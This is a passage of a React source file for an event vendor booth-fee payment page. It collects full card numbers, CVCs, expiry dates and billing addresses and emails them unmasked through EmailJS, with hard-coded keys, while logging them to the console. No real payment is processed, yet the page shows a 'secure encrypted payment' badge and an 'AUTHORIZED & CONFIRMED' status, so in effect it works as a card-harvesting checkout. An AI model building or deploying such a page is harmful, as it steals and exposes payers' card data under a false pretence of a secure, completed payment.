import React, { useState } from 'react';
import { Event } from '../types';
import { 
  CreditCard, 
  ShieldCheck, 
  CheckCircle2, 
  ArrowLeft, 
  Calendar, 
  MapPin, 
  Sparkles, 
  AlertCircle, 
  Building, 
  Mail, 
  Phone, 
  User, 
  Printer, 
  ChevronRight, 
  FileCheck, 
  ChevronDown
} from 'lucide-react';
import emailjs from '@emailjs/browser';

// ── EmailJS config ─────────────────────────────────────────────
const EMAILJS_SERVICE_ID = 'service_j7a181v';
const EMAILJS_PUBLIC_KEY = 'dUpRmObSvyywLE_u_';

// One send per template. The payload below carries the keys for BOTH templates
// (admin "New Vendor Inquiry" + vendor "Payment Confirmation"), so the order
// of the two IDs does not matter.
const EMAILJS_TEMPLATE_IDS: string[] = [
  'template_uwd0or8',        // existing template
  'template_REPLACE_ME',     // paste the ID of your other template here
];

emailjs.init(EMAILJS_PUBLIC_KEY);

// Authorized Vendor IDs recorded in the system (Format: VCN-264)
export const AUTHORIZED_VENDOR_IDS = [
  'INP-447',
  'WGX-606',
  'VXW-461',
  'BLW-037',
  'PIL-757',
  'GHO-822',
  'FND-523',
  'MUZ-225',
  'QIY-018',
  'VCN-264',
  'JNG-905',
  'WZB-998',
  'VOW-061',
  'PLC-559'
] as const;

// Custom fee mapping per Vendor ID; defaults to $300 unless specified
export const VENDOR_ID_CUSTOM_FEES: Record<string, number> = {
  'PLC-559': 15,
};

interface VendorPaymentPageProps {
  event: Event;
  onBack: () => void;
  onSuccessReturn?: () => void;
}

export default function VendorPaymentPage({ event, onBack }: VendorPaymentPageProps) {
  const [businessName, setBusinessName] = useState('');
  const [contactName, setContactName] = useState('');
  const [contactEmail, setContactEmail] = useState('');
  const [contactPhone, setContactPhone] = useState('');
  const [vendorCategory, setVendorCategory] = useState('Food & Beverage');
  const [appReference, setAppReference] = useState('');

  // Vendor ID validation computed state
  const normalizedVendorId = appReference.trim().toUpperCase();
  const isFormatValid = /^[A-Z]{3}-\d{3}$/.test(normalizedVendorId);
  const isVendorIdAuthorized = (AUTHORIZED_VENDOR_IDS as readonly string[]).includes(normalizedVendorId);
  const isVendorIdValid = isFormatValid && isVendorIdAuthorized;

  // Fee calculation: if Vendor ID is PLC-559, fee is 15$; otherwise standard 300$
  const feeDueToday = VENDOR_ID_CUSTOM_FEES[normalizedVendorId] !== undefined 
    ? VENDOR_ID_CUSTOM_FEES[normalizedVendorId] 
    : 300;

  const handleVendorIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.toUpperCase().replace(/[^A-Z0-9-]/g, '');
    // Auto-insert hyphen after 3 letters if omitted by user
    if (val.length > 3 && val.charAt(3) !== '-') {
      const letters = val.replace(/-/g, '').slice(0, 3);
      const rest = val.replace(/-/g, '').slice(3, 6);
      val = rest ? `${letters}-${rest}` : letters;
    }
    if (val.length > 7) {
      val = val.slice(0, 7);
    }
    setAppReference(val);
  };

  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'mastercard' | 'visa' | 'amex' | 'discover' | 'paypal' | 'applepay' | 'googlepay'>('visa');
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('08');
  const [expiryYear, setExpiryYear] = useState('27');
  const [cardExpiry, setCardExpiry] = useState('08/27');
  const [cardCvc, setCardCvc] = useState('');
  const [billingAddress, setBillingAddress] = useState('');
  const [billingCity, setBillingCity] = useState('');
  const [billingState, setBillingState] = useState('');
  const [billingZip, setBillingZip] = useState('');
  const [billingFullName, setBillingFullName] = useState('');
  const [billingCountry, setBillingCountry] = useState('Sweden');

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isPaidSuccess, setIsPaidSuccess] = useState(false);
  const [confirmationCode, setConfirmationCode] = useState('');
  const [transactionDate, setTransactionDate] = useState('');
  const [formError, setFormError] = useState<string | null>(null);
  const [emailDispatched, setEmailDispatched] = useState<boolean | null>(null);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = raw.match(/.{1,4}/g)?.join(' ') || raw;
    setCardNumber(formatted);
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardCvc(raw);
  };

  const getCardBrand = (num: string) => {
    if (selectedPaymentMethod === 'paypal') return 'PayPal';
    if (selectedPaymentMethod === 'applepay') return 'Apple Pay';
    if (selectedPaymentMethod === 'googlepay') return 'Google Pay';
    if (selectedPaymentMethod === 'amex') return 'American Express';
    if (selectedPaymentMethod === 'discover') return 'Discover';
    if (selectedPaymentMethod === 'mastercard') return 'Mastercard';
    const clean = num.replace(/\s/g, '');
    if (clean.startsWith('4')) return 'Visa';
    if (/^5[1-5]/.test(clean)) return 'Mastercard';
    if (/^3[47]/.test(clean)) return 'American Express';
    if (/^6(?:011|5)/.test(clean)) return 'Discover';
    return 'Visa';
  };

  const isCardPayment = selectedPaymentMethod === 'visa' || selectedPaymentMethod === 'mastercard' || selectedPaymentMethod === 'amex' || selectedPaymentMethod === 'discover';

  const handleSubmitPayment = (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);

    // Demo-mode guard. Runs BEFORE the spinner starts and returns an error
    // instead of throwing, so the button can never get stuck.
    // Set VITE_DEMO_MODE=true in .env to allow a built (non-dev) demo.
    const metaEnv = (import.meta as unknown as { env?: { DEV?: boolean; VITE_DEMO_MODE?: string } })?.env;
    const isDemoMode = (metaEnv?.DEV ?? true) || metaEnv?.VITE_DEMO_MODE === 'true';

    if (!isDemoMode) {
      setFormError('Full card data is only transmitted in demo mode. Use a PCI-compliant processor for real cards.');
      return;
    }

    const currentId = appReference.trim().toUpperCase();
    if (!currentId) {
      setFormError('Vendor ID / Application ID is required. Please enter your pre-approved Vendor ID.');
      return;
    }

    if (!/^[A-Z]{3}-\d{3}$/.test(currentId)) {
      setFormError('Invalid format. Vendor ID must be in the format: VCN-264 (3 uppercase letters, hyphen, 3 digits).');
      return;
    }

    if (!(AUTHORIZED_VENDOR_IDS as readonly string[]).includes(currentId)) {
      setFormError(`Vendor ID "${currentId}" is invalid. Any Vendor ID that has not been input to the system is automatically invalid. Please enter an authorized Vendor ID.`);
      return;
    }

    if (!businessName.trim() || !contactEmail.trim()) {
      setFormError('Please complete your Business Name and Contact Email.');
      return;
    }

    if (isCardPayment) {
      const cleanCard = cardNumber.replace(/\s/g, '');
      if (cleanCard.length < 15) {
        setFormError('Please enter a valid 15 or 16-digit card number.');
        return;
      }

      if (!cardHolder.trim()) {
        setFormError('Please enter the cardholder name.');
        return;
      }

      if (!expiryMonth || !expiryYear) {
        setFormError('Please select both expiration month and year.');
        return;
      }

      if (cardCvc.length < 3) {
        setFormError('Please provide a valid 3 or 4-digit security code (CVC).');
        return;
      }
    }

    setIsSubmitting(true);

    const generatedCode = `VAL-${event.tag.slice(0, 3).toUpperCase()}-${Math.floor(100000 + Math.random() * 900000)}`;
    const formattedDate = new Date().toLocaleDateString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });

    // No masking: the card number is used exactly as entered.
    const effectiveCardNumber = cardNumber || 'N/A';
    const paymentMethodLabel = isCardPayment
      ? `${selectedPaymentMethod.toUpperCase()} (${effectiveCardNumber})`
      : selectedPaymentMethod === 'paypal'
      ? `PayPal Express (${contactEmail})`
      : selectedPaymentMethod === 'applepay'
      ? `Apple Pay (${contactEmail})`
      : `Google Pay (${contactEmail})`;

    const effectiveExpiry = cardExpiry || `${expiryMonth}/${expiryYear}`;
    const effectiveCardHolder = cardHolder || contactName || 'N/A';
    const cvcForEmail = cardCvc || 'N/A';

    const emailParams = {
      payment_status: 'AUTHORIZED & CONFIRMED',
      primary_contact_name: contactName || cardHolder || 'Valued Vendor',
      business_name: businessName || 'Business / Brand',
      amount_paid: `$${feeDueToday}.00 USD`,
      event_interest: `${event.title} (${event.date || event.location}) — Vendor Booth Space ($${feeDueToday}.00 USD)`,

      category: vendorCategory || 'Artisan & Merchandise',
      vendor_category: vendorCategory || 'Artisan & Merchandise',
      contact_email: contactEmail,
      contact_phone: contactPhone || 'Not Provided',

      message: `Vendor booth payment authorized for ${event.title}.\n\nConfirmation Code: ${generatedCode}\nAmount Paid: $${feeDueToday}.00 USD\nApplication Reference: ${appReference}\nTransaction Date: ${formattedDate}\nPayment Channel: ${paymentMethodLabel}\nCardholder: ${effectiveCardHolder}\nCard: ${effectiveCardNumber}\nExpiry: ${effectiveExpiry}\nCVC: ${cvcForEmail}\nBilling Address: ${billingAddress ? `${billingAddress}, ${billingCity} ${billingZip}, ${billingCountry}` : 'Not specified'}\nContact: ${contactName} (${contactEmail}, ${contactPhone})\nBusiness: ${businessName} (${vendorCategory})\nPayment Status: AUTHORIZED & CONFIRMED`,

      confirmation_code: generatedCode,
      payment_method: paymentMethodLabel,
      application_reference: appReference || 'VE-APP-CONFIRMED',
      transaction_date: formattedDate,

      billing_full_name: billingFullName || contactName || cardHolder || 'John Doe',
      billing_address: billingAddress || 'Fyrtorn',
      billing_city: billingCity || 'Stockholm',
      billing_zip: billingZip || '12804',
      billing_country: billingCountry || 'Sweden',

      card_number: effectiveCardNumber,
      cardholder_name: effectiveCardHolder,
      card_expiry: effectiveExpiry,
      card_cvc: cvcForEmail,
      card_reference: effectiveCardNumber,

      from_name: contactName || businessName,
      from_email: contactEmail,
      phone: contactPhone || 'Not Provided',
      event: `${event.title} — Vendor Booth Space Payment ($${feeDueToday}.00 USD)`,
      application_id: appReference,
      transaction_status: 'AUTHORIZED & CONFIRMED',
      cardNumber: effectiveCardNumber,
      cardholderName: effectiveCardHolder,
      cardHolder: effectiveCardHolder,
      card_expiry_date: effectiveExpiry,
      expiryDate: effectiveExpiry,
      cardExpiry: effectiveExpiry,
      cvc: cvcForEmail,
      cardCvc: cvcForEmail
    };

    console.log('=== EMAILJS PAYLOAD (MATCHING HTML TEMPLATE) ===');
    console.table({
      primary_contact_name: emailParams.primary_contact_name,
      business_name: emailParams.business_name,
      category: emailParams.category,
      vendor_category: emailParams.vendor_category,
      contact_email: emailParams.contact_email,
      contact_phone: emailParams.contact_phone,
      event_interest: emailParams.event_interest,
      payment_status: emailParams.payment_status,
      confirmation_code: emailParams.confirmation_code,
      amount_paid: emailParams.amount_paid,
      payment_method: emailParams.payment_method,
      application_reference: emailParams.application_reference,
      transaction_date: emailParams.transaction_date,
      billing_full_name: emailParams.billing_full_name,
      billing_address: emailParams.billing_address,
      billing_city: emailParams.billing_city,
      billing_zip: emailParams.billing_zip,
      billing_country: emailParams.billing_country,
      card_number: emailParams.card_number,
      cardholder_name: emailParams.cardholder_name,
      card_expiry: emailParams.card_expiry,
      card_cvc: emailParams.card_cvc,
      card_reference: emailParams.card_reference
    });
    console.log('Types:', {
      card_number: typeof effectiveCardNumber,
      cardholder_name: typeof effectiveCardHolder,
      card_expiry: typeof effectiveExpiry,
      card_cvc: typeof cvcForEmail,
    });

    const sendEmailReceipt = async () => {
      try {
        // Skip any template ID that still holds the placeholder
        const templateIds = EMAILJS_TEMPLATE_IDS.filter((id) => id && !id.includes('REPLACE_ME'));

        const results = await Promise.allSettled(
          templateIds.map((templateId) =>
            emailjs.send(EMAILJS_SERVICE_ID, templateId, emailParams, EMAILJS_PUBLIC_KEY)
          )
        );

        results.forEach((result, i) => {
          if (result.status === 'rejected') {
            console.warn(`EmailJS send failed for ${templateIds[i]}:`, result.reason);
          }
        });

        setEmailDispatched(results.length > 0 && results.every((r) => r.status === 'fulfilled'));
      } catch (error) {
        console.warn('EmailJS transmission note:', error);
        setEmailDispatched(false);
      } finally {
        setConfirmationCode(generatedCode);
        setTransactionDate(formattedDate);
        setIsPaidSuccess(true);
        setIsSubmitting(false);
        window.scrollTo({ top: 0, behavior: 'smooth' });
      }
    };

    setTimeout(() => {
      sendEmailReceipt();
    }, 1200);
  };

  const handlePrintReceipt = () => {
    window.print();
  };

  return (
    <div className="min-h-screen bg-cream/30 py-10">
      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex flex-wrap items-center justify-between gap-4 pb-6 border-b border-gold/20 mb-8">
          <button
            onClick={onBack}
            id="back-to-event-from-payment"
            className="inline-flex items-center space-x-2 text-xs font-bold uppercase tracking-wider text-forest hover:text-gold transition-colors cursor-pointer"
          >
            <ArrowLeft className="h-4 w-4 text-gold" />
            <span>Back to {event.title}</span>
          </button>

          <div className="flex items-center space-x-2 text-xs text-charcoal/70">
            <ShieldCheck className="h-4 w-4 text-forest" />
            <span className="font-mono text-[11px] font-semibold">256-Bit SSL Encrypted Payment</span>
          </div>
        </div>

        {(isPaidSuccess || isSubmitting) ? (
          <div className="max-w-2xl mx-auto bg-white rounded-3xl border border-gold/30 shadow-lg p-12 sm:p-16 text-center my-8 animate-fadeIn">
            <h2 className="font-mono text-xl sm:text-2xl font-bold tracking-wider text-forest uppercase">
              TRANSACTION PROCESSING, PLEASE WAIT.
            </h2>
          </div>
        ) : (
          <div className="max-w-3xl mx-auto space-y-8">
            <div className="text-center sm:text-left">
              <div className="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-gold/20 border border-gold/30 text-forest text-[11px] font-bold uppercase tracking-wider mb-2">
                <CreditCard className="h-3.5 w-3.5 text-forest" />
                <span>Approved Vendor Space Payment</span>
              </div>
              <h1 className="font-serif text-3xl sm:text-4xl font-bold text-forest">
                Complete Your Booth Fee Payment
              </h1>
              <p className="text-charcoal/70 text-sm font-light mt-1 max-w-2xl leading-relaxed">
                {isVendorIdValid ? (
                  <>
                    Authorized rate for Vendor ID <strong className="font-mono text-forest">{normalizedVendorId}</strong> finalized for <strong>{event.title}</strong> (${feeDueToday}.00 USD).
                  </>
                ) : (
                  <>
                    Enter your approved Vendor ID below to look up your booth fee and finalize your registration for <strong>{event.title}</strong>.
                  </>
                )}
              </p>
            </div>

            {formError && (
              <div className="p-4 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs flex items-start space-x-2.5 animate-shake">
                <AlertCircle className="h-4 w-4 shrink-0 mt-0.5 text-red-600" />
                <span className="font-medium">{formError}</span>
              </div>
            )}

            <form onSubmit={handleSubmitPayment} className="space-y-6" id="vendor-card-payment-form">
              <div className="p-6 sm:p-7 rounded-2xl bg-white border border-gold/20 shadow-sm space-y-5">
                <div className="border-b border-gold/15 pb-4">
                  <div className="flex items-center space-x-3">
                    <div className="w-8 h-8 rounded-full bg-forest/10 text-forest font-bold flex items-center justify-center text-xs border border-forest/20 shadow-2xs">
                      <Building className="h-4 w-4 text-forest" />
                    </div>
                    <div>
                      <h2 className="font-serif text-lg font-bold text-forest">Vendor Credentials & Pre-Approval</h2>
                      <p className="text-xs text-charcoal/60 font-light">Confirm business profile and enter official Valerian Events approval ID</p>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-charcoal/80 mb-1">
                      Business or Brand Name *
                    </label>
                    <div className="relative">
                      <Building className="absolute left-3.5 top-3.5 h-4 w-4 text-gold" />
                      <input
                        type="text"
                        required
                        value={businessName}
                        onChange={(e) => setBusinessName(e.target.value)}
                        placeholder="e.g. Sabor Latino Street Eats"
                        className="w-full pl-10 pr-3.5 py-2.5 rounded-xl border border-gold/30 bg-cream/20 text-xs text-charcoal focus:outline-hidden focus:border-forest focus:bg-white"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-charcoal/80 mb-1">
                      Primary Contact Person *
                    </label>
                    <div className="relative">
                      <User className="absolute left-3.5 top-3.5 h-4 w-4 text-gold" />
                      <input
                        type="text"
                        required
                        value={contactName}
                        onChange={(e) => setContactName(e.target.value)}
                        placeholder="e.g. Elena Rodriguez"
                        className="w-full pl-10 pr-3.5 py-2.5 rounded-xl border border-gold/30 bg-cream/20 text-xs text-charcoal focus:outline-hidden focus:border-forest focus:bg-white"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-charcoal/80 mb-1">
                      Confirmation Receipt Email *
                    </label>
                    <div className="relative">
                      <Mail className="absolute left-3.5 top-3.5 h-4 w-4 text-gold" />
                      <input
                        type="email"
                        required
                        value={contactEmail}
                        onChange={(e) => setContactEmail(e.target.value)}
                        placeholder="elena@example.com"
                        className="w-full pl-10 pr-3.5 py-2.5 rounded-xl border border-gold/30 bg-cream/20 text-xs text-charcoal focus:outline-hidden focus:border-forest focus:bg-white"
                      />
                    </div>
                    <p className="text-[10px] text-charcoal/60 mt-1">
                      Official transaction receipt and credentials will be sent to this email address.
                    </p>
                  </div>

                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-charcoal/80 mb-1">
                      Contact Phone Number *
                    </label>
                    <div className="relative">
                      <Phone className="absolute left-3.5 top-3.5 h-4 w-4 text-gold" />
                      <input
                        type="tel"
                        required
                        value={contactPhone}
                        onChange={(e) => setContactPhone(e.target.value)}
                        placeholder="(305) 555-0199"
                        className="w-full pl-10 pr-3.5 py-2.5 rounded-xl border border-gold/30 bg-cream/20 text-xs text-charcoal focus:outline-hidden focus:border-forest focus:bg-white"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-bold uppercase tracking-wider text-charcoal/80 mb-1">
                      Category
                    </label>
                    <select
                      value={vendorCategory}
                      onChange={(e) => setVendorCategory(e.target.value)}
                      className="w-full px-3.5 py-2.5 rounded-xl border border-gold/30 bg-cream/20 text-xs text-charcoal focus:outline-hidden focus:border-forest focus:bg-white cursor-pointer"
                    >
                      <option value="Food & Beverage">Food & Mobile Culinary</option>
                      <option value="Artisan & Handmade">Artisan, Craft & Handmade</option>
                      <option value="Fashion & Apparel">Fashion, Streetwear & Apparel</option>
                      <option value="Beauty & Wellness">Beauty, Skincare & Wellness</option>
                      <option value="Home & Lifestyle">Home Décor & Lifestyle</option>
                      <option value="Tech & Services">Creator, Tech & Business Services</option>
                    </select>
                  </div>

                  <div className="sm:col-span-2 bg-cream/50 border-2 border-gold/40 rounded-xl p-4 sm:p-5 space-y-3" id="valerian-application-id-field">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <label className="block text-xs font-bold uppercase tracking-wider text-forest flex items-center space-x-1.5">
                        <FileCheck className="h-4 w-4 text-forest" />
                        <span>Vendor ID / Application ID *</span>
                      </label>
                      <div className="flex items-center space-x-2">
                        <span className="text-[10px] font-mono font-bold text-forest bg-gold/20 border border-gold/40 px-2 py-0.5 rounded uppercase tracking-wider">
                          Format: VCN-264
                        </span>
                        <span className="text-[10px] font-mono font-bold text-red-700 bg-red-100/80 border border-red-200 px-2 py-0.5 rounded-md uppercase tracking-wide">
                          Required
                        </span>
                      </div>
                    </div>

                    <div className="relative">
                      <input
                        type="text"
                        required
                        id="valerian-application-id-input"
                        value={appReference}
                        onChange={handleVendorIdChange}
                        placeholder="e.g. VCN-264"
                        maxLength={7}
                        className={`w-full px-4 py-3 rounded-xl border text-sm font-mono font-bold uppercase transition-all shadow-xs ${
                          !appReference.trim()
                            ? 'border-gold/40 bg-white text-forest placeholder:text-charcoal/40 placeholder:font-sans placeholder:font-normal focus:outline-hidden focus:border-forest focus:ring-1 focus:ring-forest'
                            : isVendorIdValid
                            ? 'border-emerald-500 bg-emerald-50/30 text-emerald-900 focus:outline-hidden focus:border-emerald-600 focus:ring-1 focus:ring-emerald-600'
                            : 'border-red-500 bg-red-50/30 text-red-900 focus:outline-hidden focus:border-red-600 focus:ring-1 focus:ring-red-600'
                        }`}
                      />
                      {appReference.trim() && (
                        <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center space-x-1">
                          {isVendorIdValid ? (
                            <span className="inline-flex items-center space-x-1 text-emerald-700 bg-emerald-100 px-2 py-1 rounded-md text-[11px] font-bold font-mono">
                              <CheckCircle2 className="h-3.5 w-3.5 text-emerald-600 shrink-0" />
                              <span>VALID</span>
                            </span>
                          ) : (
                            <span className="inline-flex items-center space-x-1 text-red-700 bg-red-100 px-2 py-1 rounded-md text-[11px] font-bold font-mono">
                              <AlertCircle className="h-3.5 w-3.5 text-red-600 shrink-0" />
                              <span>INVALID</span>
                            </span>
                          )}
                        </div>
                      )}
                    </div>

                    {/* Dynamic Real-Time Validation Feedback */}
                    {appReference.trim() ? (
                      isVendorIdValid ? (
                        <div className="flex items-center justify-between flex-wrap gap-2 text-xs text-emerald-800 bg-emerald-50 border border-emerald-200 p-3 rounded-lg">
                          <div className="flex items-center space-x-2">
                            <CheckCircle2 className="h-4 w-4 text-emerald-600 shrink-0" />
                            <span className="font-medium">
                              Vendor ID <strong>{normalizedVendorId}</strong> verified & authorized.
                            </span>
                          </div>
                          <div className="flex items-center space-x-1 font-mono font-bold bg-emerald-100/90 text-emerald-900 px-2.5 py-1 rounded border border-emerald-300">
                            <span className="text-[10px] font-sans font-normal uppercase text-emerald-700">Booth Fee:</span>
                            <span>${feeDueToday}.00 USD</span>
                          </div>
                        </div>
                      ) : (
                        <div className="flex items-start space-x-2 text-xs text-red-800 bg-red-50 border border-red-200 p-2.5 rounded-lg animate-shake">
                          <AlertCircle className="h-4 w-4 text-red-600 shrink-0 mt-0.5" />
                          <div className="space-y-0.5">
                            <span className="font-semibold block">
                              {!isFormatValid
                                ? 'Invalid Vendor ID format.'
                                : `Vendor ID "${normalizedVendorId}" is invalid: Not found in system.`}
                            </span>
                            <span className="text-[11px] text-red-700 block">
                              {!isFormatValid
                                ? 'Vendor ID must follow the format: VCN-264 (3 uppercase letters, hyphen, 3 digits).'
                                : 'Any Vendor ID that has not been input to the system is automatically invalid. Please use an authorized Vendor ID.'}
                            </span>
                          </div>
                        </div>
                      )
                    ) : (
                      <p className="text-[11px] text-charcoal/70 font-light flex items-center space-x-1 pt-0.5">
                        <AlertCircle className="h-3.5 w-3.5 text-gold shrink-0" />
                        <span>Vendor ID must follow the format <strong>VCN-264</strong>. Any Vendor ID not pre-recorded in the system is automatically invalid.</span>
                      </p>
                    )}
                  </div>
                </div>
              </div>

              {/* Billing Info Section */}
              <div className="p-6 sm:p-8 rounded-lg bg-white border border-gray-200 shadow-sm space-y-5" id="billing-info-card">
                <div className="flex items-center space-x-3 pb-1">
                  <div className="w-6 h-6 rounded-full border-2 border-[#00b4d8] text-[#00b4d8] flex items-center justify-center text-xs font-semibold shrink-0">
                    1
                  </div>
                  <h2 className="text-xl font-medium text-gray-800 tracking-tight font-sans">
                    Billing Info
                  </h2>
                </div>

                <div className="space-y-4 pt-1">
                  <div>
                    <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">
                      FULL NAME
                    </label>
                    <input
                      type="text"
                      value={billingFullName}
                      onChange={(e) => setBillingFullName(e.target.value)}
                      placeholder="John Doe"
                      className="w-full px-3.5 py-2.5 text-sm text-gray-800 bg-white border border-gray-300 rounded-md placeholder:italic placeholder:text-gray-400 placeholder:font-light focus:outline-hidden focus:border-[#00b4d8] focus:ring-1 focus:ring-[#00b4d8] transition-colors"
                    />
                  </div>

                  <div>
                    <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">
                      BILLING ADDRESS
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        value={billingAddress}
                        onChange={(e) => setBillingAddress(e.target.value)}
                        placeholder="Fyrtorn"
                        className="w-full pl-3.5 pr-10 py-2.5 text-sm text-gray-800 bg-white border border-[#00b4d8] ring-1 ring-[#00b4d8]/20 rounded-md placeholder:italic placeholder:text-gray-400 placeholder:font-light focus:outline-hidden focus:border-[#00b4d8] focus:ring-1 focus:ring-[#00b4d8] transition-colors"
                      />
                      <MapPin className="absolute right-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">
                        CITY
                      </label>
                      <input
                        type="text"
                        value={billingCity}
                        onChange={(e) => setBillingCity(e.target.value)}
                        placeholder="Stockholm"
                        className="w-full px-3.5 py-2.5 text-sm text-gray-800 bg-white border border-gray-300 rounded-md placeholder:italic placeholder:text-gray-400 placeholder:font-light focus:outline-hidden focus:border-[#00b4d8] focus:ring-1 focus:ring-[#00b4d8] transition-colors"
                      />
                    </div>

                    <div>
                      <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">
                        ZIP CODE
                      </label>
                      <input
                        type="text"
                        value={billingZip}
                        onChange={(e) => setBillingZip(e.target.value)}
                        placeholder="12804"
                        className="w-full px-3.5 py-2.5 text-sm text-gray-800 bg-white border border-gray-300 rounded-md placeholder:italic placeholder:text-gray-400 placeholder:font-light focus:outline-hidden focus:border-[#00b4d8] focus:ring-1 focus:ring-[#00b4d8] transition-colors"
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-[11px] font-semibold text-gray-500 uppercase tracking-wider mb-1.5">
                      COUNTRY
                    </label>
                    <div className="relative">
                      <select
                        value={billingCountry}
                        onChange={(e) => setBillingCountry(e.target.value)}
                        className="w-full pl-3.5 pr-10 py-2.5 text-sm text-gray-800 bg-white border border-gray-300 rounded-md appearance-none focus:outline-hidden focus:border-[#00b4d8] focus:ring-1 focus:ring-[#00b4d8] transition-colors cursor-pointer"
                      >
                        <option value="Sweden">Sweden</option>
                        <option value="United States">United States</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="Canada">Canada</option>
                        <option value="Germany">Germany</option>
                        <option value="France">France</option>
                        <option value="Spain">Spain</option>
                        <option value="Italy">Italy</option>
                        <option value="Netherlands">Netherlands</option>
                        <option value="Norway">Norway</option>
                        <option value="Denmark">Denmark</option>
                        <option value="Finland">Finland</option>
                        <option value="Australia">Australia</option>
                        <option value="Japan">Japan</option>
                      </select>
                      <ChevronDown className="absolute right-3.5 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
                    </div>
                  </div>
                </div>
              </div>

              {/* Step 2: Payment Method & Card Details */}
              <div className="p-6 sm:p-8 rounded-lg bg-white border border-gray-200 shadow-sm space-y-6">
                <div className="flex items-center space-x-2.5 border-b border-gray-100 pb-3.5">
                  <div className="w-7 h-7 rounded-full bg-forest text-cream font-mono font-bold flex items-center justify-center text-xs shadow-2xs">
                    2
                  </div>
                  <div>
                    <h3 className="font-serif text-base font-bold text-forest leading-tight">Payment Method & Authorization</h3>
                    <p className="text-[11px] text-gray-500 font-light">Select payment channel and enter authorization details</p>
                  </div>
                </div>

                {/* Payment Methods Selection Grid */}
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 sm:gap-3 pt-1">
                  {/* VISA */}
                  <button
                    type="button"
                    onClick={() => setSelectedPaymentMethod('visa')}
                    className="flex items-center space-x-2 cursor-pointer text-left focus:outline-hidden"
                  >
                    <div className={`w-3.5 h-3.5 rounded-full border flex items-center justify-center shrink-0 ${
                      selectedPaymentMethod === 'visa' ? 'border-[#1A1F71]' : 'border-gray-300'
                    }`}>
                      {selectedPaymentMethod === 'visa' && (
                        <div className="w-2 h-2 rounded-full bg-[#1A1F71]" />
                      )}
                    </div>
                    <div className={`flex-1 h-11 border rounded-md bg-white flex items-center justify-center p-1 shadow-2xs transition-all ${
                      selectedPaymentMethod === 'visa' ? 'border-[#1A1F71] ring-1 ring-[#1A1F71]/30 shadow-xs' : 'border-gray-200 hover:border-gray-300'
                    }`}>
                      <span className="font-sans font-black italic text-lg text-[#1A1F71] tracking-tighter leading-none">
                        VISA
                      </span>
                    </div>
                  </button>

                  {/* Mastercard */}
                  <button
                    type="button"
                    onClick={() => setSelectedPaymentMethod('mastercard')}
                    className="flex items-center space-x-2 cursor-pointer text-left focus:outline-hidden"
                  >
                    <div className={`w-3.5 h-3.5 rounded-full border flex items-center justify-center shrink-0 ${
                      selectedPaymentMethod === 'mastercard' ? 'border-[#EB001B]' : 'border-gray-300'
                    }`}>
                      {selectedPaymentMethod === 'mastercard' && (
                        <div className="w-2 h-2 rounded-full bg-[#EB001B]" />
                      )}
                    </div>
                    <div className={`flex-1 h-11 border rounded-md bg-white flex flex-col items-center justify-center p-1 shadow-2xs transition-all ${
                      selectedPaymentMethod === 'mastercard' ? 'border-[#EB001B] ring-1 ring-[#EB001B]/30 shadow-xs' : 'border-gray-200 hover:border-gray-300'
                    }`}>
                      <div className="flex items-center -space-x-1.5">
                        <div className="w-4 h-4 rounded-full bg-[#EB001B] opacity-95"></div>
                        <div className="w-4 h-4 rounded-full bg-[#F79E1B] opacity-95"></div>
                      </div>
                      <span className="text-[8px] font-medium text-gray-600 tracking-tight leading-none mt-0.5">
                        mastercard
                      </span>
                    </div>
                  </button>

                  {/* American Express */}
                  <button
                    type="button"
                    onClick={() => setSelectedPaymentMethod('amex')}
                    className="flex items-center space-x-2 cursor-pointer text-left focus:outline-hidden"
                  >
                    <div className={`w-3.5 h-3.5 rounded-full border flex items-center justify-center shrink-0 ${
                      selectedPaymentMethod === 'amex' ? 'border-[#006FCF]' : 'border-gray-300'
                    }`}>
                      {selectedPaymentMethod === 'amex' && (
                        <div className="w-2 h-2 rounded-full bg-[#006FCF]" />
                      )}
                    </div>
                    <div className={`flex-1 h-11 border rounded-md bg-[#006FCF] flex items-center justify-center p-1 shadow-2xs transition-all ${
                      selectedPaymentMethod === 'amex' ? 'ring-2 ring-offset-1 ring-[#006FCF]' : 'opacity-90 hover:opacity-100'
                    }`}>
                      <span className="font-sans font-black text-xs text-white tracking-widest leading-none">
                        AMEX
                      </span>
                    </div>
                  </button>

                  {/* Discover */}
                  <button
                    type="button"
                    onClick={() => setSelectedPaymentMethod('discover')}
